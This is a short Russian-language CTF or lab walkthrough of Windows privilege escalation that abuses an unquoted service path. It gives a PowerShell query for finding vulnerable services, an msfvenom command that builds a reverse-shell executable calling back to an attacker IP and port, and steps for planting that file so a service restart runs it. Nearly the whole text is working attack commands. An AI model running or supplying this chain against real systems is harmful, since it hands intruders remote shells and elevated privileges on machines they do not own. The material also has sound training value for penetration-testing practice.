Подключаемся к машине и ищем службы у который путь к исполняемому файлу содержит пробелы

```
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -match " " -and $_.PathName -notmatch '"' } | Select-Object Name, PathName, StartName

.....
.....

MyLegacyService                  C:\Program Files\TestService\Legacy Software Application For User.exe 

.....
.....
```

Создаем файл для обратного шелла ``msfvenom -p windows/shell_reverse_tcp LHOST=100.100.2.252 LPORT=4444 -f exe > 'Legacy.exe'``
Передаем его на машину и помещаем в папку C:\Program Files\TestService. Из-за отсутствия кавычек в наименование исполняемого файла будет запущен первый найденный файл (legacy.exe /Legacy Software.exe / Legacy Software Application.exe .....)
Запускаем слушателя и перезапускаем службу MyLegacyService => получаем флаг
